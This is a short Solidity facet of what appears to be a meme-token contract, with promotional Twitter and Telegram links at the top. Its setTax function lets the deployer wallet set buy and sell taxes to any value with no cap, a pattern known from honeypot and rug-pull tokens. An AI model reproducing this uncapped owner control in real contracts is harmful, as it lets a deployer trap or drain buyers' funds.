/*

https://twitter.com/Jason/status/1774821337422602443

 TG: https://t.me/egreedeth

*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.22;
import "./TestLib.sol";
contract setTaxFacet is Context, Ownable {
    using SafeMath for uint256;

    modifier lockTheSwap() {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.inSwap = true;
        _;
        ds.inSwap = false;
    }

    function setTax(uint256 finalBuyTax_, uint256 finalSellTax_) public {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(ds._deployerWallet == _msgSender());
        ds._finalBuyTax = finalBuyTax_;
        ds._finalSellTax = finalSellTax_;
    }
}
